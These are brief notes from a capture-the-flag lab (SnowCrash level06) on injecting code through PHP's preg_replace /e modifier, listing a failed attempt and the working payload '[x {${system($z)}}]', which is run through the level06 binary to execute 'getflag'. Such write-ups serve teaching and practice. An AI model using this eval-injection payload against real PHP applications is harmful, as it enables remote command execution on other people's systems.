notice :
/e at the end of first pattern mean the code to be replaced with will be executed
https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
e (PREG_REPLACE_EVAL)

The second problem is that the replacement uses the match inside a string,
so the 2nd match will not be evaluated as code.

Payload is inside double quoted strings, so just injecting any PHP code will not work
You may think that simply escaping the string via " would solve the problem,
but that will not work, as double quotes are escaped in all references.

tried :
[ x ${system("ls")}] : some php parsing error
the trick was to put bracket {} before ${} (  {${system(ls)}}  )
it is because of the quotes "

second argument of level06 executable take a string, notice that the function x() take 2 arguments
the 2nd argument of this function is also pass to the executable

level06@SnowCrash:~$ cat /var/tmp/level06.php
[x {${system($z)}}]

./level06 /var/tmp/level06.php "getflag"
